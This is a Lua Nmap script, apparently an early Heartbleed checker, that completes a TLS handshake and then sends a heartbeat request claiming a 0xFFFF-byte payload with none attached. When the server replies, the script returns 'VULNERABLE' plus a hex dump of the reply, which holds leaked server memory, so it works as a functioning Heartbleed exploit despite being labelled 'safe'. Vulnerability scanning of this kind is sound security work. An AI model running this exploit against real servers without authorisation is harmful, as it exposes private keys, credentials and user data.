local nmap = require "nmap"
local nsedebug = require "nsedebug"
local shortport = require "shortport"
local stdnse = require "stdnse"
local bin = require "bin"
local tls = require "tls"

description = [[
Checks for the Heartbleed bug

References:
* http://heartbleed.com/
]]

---
-- @usage
-- nmap --script=tls-heartbeat <targets>
--
--@output
-- 443/tcp open  https
-- |_tls-heartbeat:
--
-- @xmloutput


author = "Daniel Miller, fixes by Mike Ryan (justfalter)"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"discovery", "safe"}

portrule = shortport.ssl

action = function(host, port)
  local sock, status, response, err, cli_h
  stdnse.print_debug(nsedebug.tostr(tls.CIPHERS))

  local ssl_protocol_ver = "TLSv1.0"

  -- Enumerate through all the ciphers that we 'know' about, just to increase
  -- our chances of successfully completing a handshake.
  local ciphers = {}
  for k, v in pairs(tls.CIPHERS) do
    ciphers[#ciphers+1] = k
  end

  cli_h = tls.client_hello({
    ["protocol"] = ssl_protocol_ver,
    ["ciphers"] = ciphers,
    ["compressors"] = {"NULL"},
    ["extensions"] = {
      ["heartbeat"] = "\x01", -- peer_not_allowed_to_send
    },
  })

  -- Connect to the target server
  sock = nmap.new_socket()
  sock:set_timeout(1000)
  status, err = sock:connect(host, port)
  if not status then
    sock:close()
    stdnse.print_debug("Can't send: %s", err)
    return nil
  end

  local handshake_done = false
  -- Send Client Hello to the target server
  status, err = sock:send(cli_h)
  if not status then
    stdnse.print_debug("Couldn't send: %s", err)
    sock:close()
    return nil
  end

  -- Read response
  local done = false
  local supported = false
  repeat
    status, response, err = tls.record_buffer(sock)
    if err == "TIMEOUT" then
      done = true
      break
    elseif not status then
      stdnse.print_debug("Couldn't receive: %s", err)
      sock:close()
      return nil
    end

    local i = 1
    while i <= #response do
      local record
      i, record = tls.record_read(response, i)
      if record == nil then
        stdnse.print_debug("%s: Unknown response from server", SCRIPT_NAME)
        return nil
      end

      if record.type == "handshake" then
        for _, body in ipairs(record.body) do
          if body.type == "server_hello" then
            if body.extensions and body.extensions["heartbeat"] == "\x01" then
              supported = true
            end
          elseif body.type == "server_hello_done" then
            stdnse.print_debug("we're done!")
            done = true
          end
        end
      end
    end
  until done -- Not done, need a completed handshake :(
  if not supported then
    stdnse.print_debug("%s: Server does not support TLS Heartbeat Requests.", SCRIPT_NAME)
    return nil
  end

  local numbytes = 0xFFFF
  local hb = tls.record_write("heartbeat", ssl_protocol_ver, bin.pack("C>S",
      1, -- heartbeat_request
      numbytes
      )
    )

  local status, err = sock:send(hb)
  -- Read response
  status, response, err = tls.record_buffer(sock)
  if not status then
    stdnse.print_debug("Couldn't receive: %s", err)
    sock:close()
    return nil
  end

  local i, record = tls.record_read(response, 0)
  if record == nil then
    stdnse.print_debug("%s: Unknown response from server", SCRIPT_NAME)
    return nil
  end

  if record.type == "heartbeat" and 
    record.body[1].type == 2 and 
    record.body[1].payload_length > 500 then
    local payload = record.body[1].payload
    -- nsedebug.print_hex(response)
    return ("VULNERABLE\n" .. stdnse.tohex(response))
    -- return ("VULNERABLE")
  else
    stdnse.print_debug("%s: Server response was not heartbeat_response", SCRIPT_NAME)
    return nil
  end
end
